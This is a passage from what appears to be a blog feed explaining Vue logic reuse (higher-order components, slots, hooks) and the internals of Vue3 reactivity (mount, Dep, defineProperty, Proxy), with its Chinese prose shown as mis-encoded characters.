é€’ç»™ Inner ç»„ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withMouse</span>(<span class="params">Inner</span>) </span>&#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> h(Inner, &#123;</span><br><span class="line">      x: <span class="keyword">this</span>.x, </span><br><span class="line">      y: <span class="keyword">this</span>.y</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = withMouse(&#123;</span><br><span class="line">  props: [<span class="string">'x'</span>, <span class="string">'y'</span>],</span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>ç›¸æ¯”äºmixinï¼Œé«˜é˜¶ç»„ä»¶æœ‰äº†è‡ªå·±çš„å‘½åç©ºé—´ï¼Œä¸ç”¨æ‹…å¿ƒå‘½åå†²çªçš„é—®é¢˜ã€‚</p><p>ä½†ä¾ç„¶ä¸èƒ½æ”¹å˜æ³¨å…¥æºä¸æ˜çš„é—®é¢˜ã€‚</p><p>å‡å¦‚æœ‰å¤šä¸ªé«˜é˜¶ç»„ä»¶åŒ…è£¹ï¼Œæˆ‘ä»¬åŒæ ·æ— æ³•çŸ¥é“å“ªä¸ªpropsæ¥è‡ªå“ªä¸ªé«˜é˜¶ç»„ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = withFoo(withAnother(withMouse(&#123;</span><br><span class="line">  props: [<span class="string">"x"</span>, <span class="string">"y"</span>, <span class="string">"foo"</span>, <span class="string">"bar"</span>]</span><br><span class="line">&#125;)))</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-slot"><a href="#3-slot" class="headerlink" title="3. slot"></a>3. slot</h3><p>åœ¨vueä¸­ï¼Œè·Ÿé«˜é˜¶ç»„ä»¶ç›¸ä¼¼çš„æ˜¯slotã€‚æŠŠæ•°æ®é€»è¾‘å°è£…åœ¨<code>&lt;Mouse /&gt;</code>ä¸­ï¼Œ<code>x, y</code>ä½œä¸ºå‚æ•°ä¼ é€’ç»™slot<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mouse</span>(<span class="params">Inner</span>) </span>&#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// template: `&lt;slot :x="x" :y="y" /&gt;`,</span></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.$slots.default &amp;&amp; <span class="keyword">this</span>.$slots.default(&#123;</span><br><span class="line">      x: <span class="keyword">this</span>.x,</span><br><span class="line">      y: <span class="keyword">this</span>.y</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  template: <span class="string">`&lt;Mouse v-slot="&#123;x, y&#125;"&gt;&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;&lt;/Mouse&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>&lt;Mouse v-slot=&quot;{x, y}&quot;&gt; &lt;/Mouse&gt;</code>å®Œæˆäº†é€»è¾‘å¤ç”¨å’Œä¼ é€’<br>æ¯”é«˜é˜¶å‡½æ•°è¦å¥½çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“<code>x,y</code>çš„æ¥æºæ˜¯<code>&lt;Mouse /&gt;</code>ã€‚<br>å­˜åœ¨å¤šä¸ªslotæ—¶ä¼šæ˜¯è¿™æ ·çš„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  component: &#123; Mouse, Foo &#125;,</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;Mouse v-slot="&#123; x, y &#125;"&gt;</span></span><br><span class="line"><span class="string">      &lt;Foo v-slot="&#123; foo &#125;"&gt;</span></span><br><span class="line"><span class="string">        &#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125; &#123;&#123; foo &#125;&#125;</span></span><br><span class="line"><span class="string">      &lt;/Foo&gt;</span></span><br><span class="line"><span class="string">    &lt;/Mouse&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>slotçœ‹ä¼¼åŒæ—¶è§£å†³äº†æ³¨å…¥æºä¸æ˜ã€å‘½åå†²çªçš„é—®é¢˜ã€‚<br>ä½†sloté¢å¤–äº§ç”Ÿäº†ç»„ä»¶ï¼Œå¢åŠ äº†æ€§èƒ½å¼€é”€</p><p><br></p><h3 id="4-Hooks"><a href="#4-Hooks" class="headerlink" title="4. Hooks"></a>4. Hooks</h3><p><code>React Class Component</code> å’Œ<code>vue2 option</code>ï¼ŒæŠŠ<code>data, method</code>éƒ½ç»‘å®šåœ¨ä¸€èµ·ï¼ŒæŠŠå®ƒä»¬æŒªåˆ°ç»„ä»¶å¤–æ˜¯ä¸€ä¸ªä»£ä»·å¾ˆå¤§çš„è¡Œä¸ºã€‚</p><p>æ„è¯†åˆ°é«˜é˜¶ç»„ä»¶ä¹Ÿä¸æ˜¯ä»€ä¹ˆçµä¸¹å¦™è¯åï¼ŒReact æå‡ºç”¨ Hooks å½»åº•å–ä»£ Class Componentï¼Œå¼€å¯äº†ç»„ä»¶é€»è¾‘è¡¨è¾¾å’Œé€»è¾‘å¤ç”¨çš„æ–°èŒƒå¼ï¼Œå®Œç¾è§£å†³äº†ä¸Šé¢çš„é—®é¢˜<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useMouse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> x = ref(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">const</span> y = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> update = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    x.value = e.pageX</span><br><span class="line">    y.value = e.pageY</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  onMounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, update)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  onUnmounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, update)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; x, y &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useFeatureA</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> bar = ref(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> &#123; bar &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y &#125; = useMouse()</span><br><span class="line">    <span class="keyword">const</span> &#123; bar &#125; = useFeatureA()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.bilibili.com/video/BV1Rr4y1L7r3/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9" target="_blank" rel="noopener">å°¤é›¨æºªå‰ç«¯è¶‹åŠ¿2022çš„ä¸»é¢˜æ¼”è®²</a></li><li><a href="https://www.bilibili.com/video/BV1rC4y187Vw/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9" target="_blank" rel="noopener">è·Ÿå°¤é›¨æºªä¸€èµ·è§£è¯»Vue3æºç </a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Bç«™è·Ÿå°¤é›¨æºªä¸€èµ·è§£è¯»Vue3æºç </title>
      <link href="/2025/02/05/Vue3-%E6%BA%90%E7%A0%81/"/>
      <url>/2025/02/05/Vue3-%E6%BA%90%E7%A0%81/</url>
      <content type="html"><![CDATA[<h3 id="1-mount-æŒ‚è½½å‡½æ•°"><a href="#1-mount-æŒ‚è½½å‡½æ•°" class="headerlink" title="1. mount æŒ‚è½½å‡½æ•°"></a>1. mount æŒ‚è½½å‡½æ•°</h3><p>å®ç°ä¸€ä¸ª<em><code>mount</code></em>æŒ‚è½½å‡½æ•°, ç”¨äºæŠŠè™šæ‹ŸdomæŒ‚è½½åˆ°çœŸå®domä¸Š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mount</span>(<span class="params">vnode, container</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> el = <span class="built_in">document</span>.createElement(vnode.tag)</span><br><span class="line">  <span class="comment">// props</span></span><br><span class="line">  <span class="keyword">if</span> (vnode.props) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> vnode.props) &#123;</span><br><span class="line">      <span class="keyword">const</span> value = vnode.props[key]</span><br><span class="line">      el.setAttribute(key, value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// children</span></span><br><span class="line">  <span class="keyword">if</span> (vnode.children) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode.children === <span class="string">'string'</span>) &#123;</span><br><span class="line">      el.textContent = vnode.children</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      vnode.children.forEach(<span class="function"><span class="params">child</span> =&gt;</span> &#123;</span><br><span class="line">        mount(child, el)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  container.appendChild(el)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params">tag, props, children</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    tag, </span><br><span class="line">    props,</span><br><span class="line">    children</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> vdom = h(<span class="string">'div'</span>, &#123; <span class="attr">class</span>: <span class="string">'red'</span> &#125;, [</span><br><span class="line">  h(<span class="string">'span'</span>, <span class="literal">null</span>, <span class="string">'hello'</span>)</span><br><span class="line">])</span><br><span class="line">mount(vdom, <span class="built_in">document</span>.getElementById(<span class="string">'app'</span>))</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-Reactive-å“åº”å¼"><a href="#2-Reactive-å“åº”å¼" class="headerlink" title="2. Reactive å“åº”å¼"></a>2. Reactive å“åº”å¼</h3><p>å“åº”å¼ï¼Œæ˜¯è‡ªåŠ¨æ›´æ–°çš„æ„æ€ï¼Œstateæ•°æ®å˜äº†ï¼Œviewä¼šè‡ªåŠ¨æ›´æ–°<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;&#123;&#123; state.a * <span class="number">10</span> &#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">onStateChanged(() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  view = render(state)</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br></pre></td></tr></table></figure></p><p>æ€ä¹ˆå®ç°è¿™ä¸ªæ•ˆæœå‘¢ï¼Ÿä¸åŒäº<code>setState</code>ï¼ŒVueä¸€ç›´ç”¨ä¾èµ–æ”¶é›†çš„æ–¹æ³•æ¥å®ç°å“åº”å¼ã€‚</p><p><br></p><h4 id="2-1-ä¾èµ–æ”¶é›†"><a href="#2-1-ä¾èµ–æ”¶é›†" class="headerlink" title="2.1 ä¾èµ–æ”¶é›†"></a>2.1 ä¾èµ–æ”¶é›†</h4><p>å‡è®¾æ¯ä¸ªå“åº”å¼å˜é‡<em><code>value</code></em>ï¼Œæœ‰ä¸€ä¸ªä¸“é—¨å¤„ç†ä¾èµ–çš„classå®ä¾‹ï¼Œæš‚å®šè¿™ä¸ªclassæ˜¯<em><code>Dep</code></em>ã€‚<br>å¦‚ä½•æŠŠ<code>Dep</code>å’Œ<code>value</code>é“¾æ¥åœ¨ä¸€èµ·?</p><ul><li>åˆ›å»ºvalueçš„åŒæ—¶ï¼Œnew Dep <code>const value = new Dep(123)</code></li><li>å½“è®¿é—®<code>value</code>æ—¶ï¼Œè§¦å‘<code>dep.depend()</code>æ¥æ”¶é›†ä¾èµ–</li><li>å½“æ”¹å˜<code>value</code>æ—¶ï¼Œè§¦å‘<code>dep.notify()</code>æ¥è§¦å‘æ›´æ–°<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> activeEffect</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.subscribers = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">    <span class="keyword">this</span>._value = value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å½“è®¿é—®å€¼æ—¶ï¼Œä¼šéšå¼è°ƒç”¨dependï¼Œä½œä¾èµ–æœé›†</span></span><br><span class="line">  get value() &#123;</span><br><span class="line">    <span class="keyword">this</span>.depend()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å½“å€¼æ›´æ–°æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨notifyï¼Œæ¥ä½œè§†å›¾æ›´æ–°</span></span><br><span class="line">  set value(newValue) &#123;</span><br><span class="line">    <span class="keyword">this</span>._value = newValue</span><br><span class="line">    <span class="keyword">this</span>.notify()</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  depend() &#123;</span><br><span class="line">    <span class="keyword">if</span> (activeEffect) &#123;</span><br><span class="line">      <span class="keyword">this</span>.subscribers.add(activeEffect)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  notify() &#123;</span><br><span class="line">    <span class="keyword">this</span>.subscribers.forEach(<span class="function"><span class="params">effect</span> =&gt;</span> &#123;</span><br><span class="line">      effect()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">watchEffect</span>(<span class="params">effect</span>) </span>&#123;</span><br><span class="line">  activeEffect = effect</span><br><span class="line">  effect()</span><br><span class="line">  activeEffect = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dep = <span class="keyword">new</span> Dep(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line">watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(dep.value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ”¹å˜å€¼ï¼Œç„¶åé€šçŸ¥æ›´æ–°</span></span><br><span class="line">dep.value = <span class="string">'changed'</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-Object-defineProperty"><a href="#2-2-Object-defineProperty" class="headerlink" title="2.2 Object.defineProperty"></a>2.2 <em><code>Object.defineProperty</code></em></h4><p>Vue2åŸºäº<em><code>Object.defineProperty</code></em>æ¥å®ç°å“åº”å¼ã€‚<br>ä½†ä¼šå¼•å‘ä¸€äº›é—®é¢˜ã€‚å¦‚ç»™dataæ·»åŠ å±æ€§æ—¶ï¼Œä¸èƒ½ç›´æ¥<code>this.$data.new = value</code>ã€‚<br>å› ä¸ºå“åº”å¼åªåœ¨ä¸€å¼€å§‹è®¾ç½®ä¸Šï¼Œåé¢ç›´æ¥åŠ çš„ä¸ä¼šæœ‰å“åº”çš„æ•ˆæœã€‚<br>æ‰€ä»¥å¯ä»¥çœ‹åˆ°Vue2å•ç‹¬æä¾›äº†APIï¼Œéœ€è¦hack inæ•°ç»„çš„<code>property</code>é‡å†™ä¸€äº›æ•°ç»„çš„å†…ç½®æ–¹æ³•ï¼Œå¦‚æ•°ç»„çš„<code>push</code>, <code>pop</code>ï¼Œè®©å…¶å¯ä»¥å®ç°å“åº”å¼<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> activeEffect</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">  subscribers = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">  </span><br><span class="line">  depend() &#123;</span><br><span class="line">    <span class="keyword">if</span> (activeEffect) &#123;</span><br><span class="line">      <span class="keyword">this</span>.subscribers.add(activeEffect)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  notify() &#123;</span><br><span class="line">    <span class="keyword">this</span>.subscribers.forEach(<span class="function"><span class="params">effect</span> =&gt;</span> &#123;</span><br><span class="line">      effect()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">watchEffect</span>(<span class="params">effect</span>) </span>&#123;</span><br><span class="line">  activeEffect = effect</span><br><span class="line">  effect()</span><br><span class="line">  activeEffect = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.keys(raw).forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    <span class="keyword">let</span> value = raw[key]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(raw, key, &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        dep.depend()</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">      &#125;,</span><br><span class="line">      set(newValue) &#123;</span><br><span class="line">        value = newValue</span><br><span class="line">        dep.notify()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> raw</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = reactive(&#123;</span><br><span class="line">  count: <span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line">watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(state.count)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">state.count = <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-proxy"><a href="#2-3-proxy" class="headerlink" title="2.3 proxy"></a>2.3 proxy</h4><p>Vue3åˆ©ç”¨<code>Reflect</code>å’Œ<code>Proxy</code>æ¥å®ç°å“åº”å¼ï¼Œæˆ‘ä»¬éœ€è¦æ”¹é€ ä¸€ä¸‹ä¸Šé¢çš„<code>reactive</code>æ–¹æ³•ã€‚<br>åŸºäºproxyçš„å®ç°ï¼Œæˆ‘ä»¬èƒ½æ£€æµ‹æ–°å±æ€§çš„æ·»åŠ ï¼Œå¹¶è‡ªåŠ¨æ·»åŠ å“åº”å¼ã€‚<br>åœ¨Vue3ï¼Œå¦‚æœreactiveçš„å˜é‡æ˜¯ä¸ªæ•°ç»„ï¼Œå½“ä½ è®¾ç½®<code>arr[index] = 1</code>ï¼Œä¼šè§¦å‘setï¼Œè€Œè®¿é—®ä¼šè§¦å‘getï¼Œä¾èµ–ä¼šè¢«è‡ªåŠ¨æ·»åŠ ã€‚å¯¹äºæ•°ç»„å˜åŒ–ï¼Œå°±ä¸ç”¨åšé¢å¤–çš„å¤„ç†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetMap = <span class="keyword">new</span> <span class="built_in">WeakMap</span>() <span class="comment">// WeakMapå¯ä»¥ç”¨objectæ¥ä½œä¸ºkey</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDep</span>(<span class="params">target, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> depsMap = targetMap.get(target)</span><br><span class="line">  <span class="keyword">if</span> (!depsMap) &#123;</span><br><span class="line">    depsMap = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    targetMap.set(target, depsMap)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> dep = depsMap.get(key)</span><br><span class="line">  <span class="keyword">if</span> (!dep) &#123;</span><br><span class="line">    dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    depsMap.set(key, dep)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dep</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> reactiveHandlers = &#123;</span><br><span class="line">  get (target, key, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    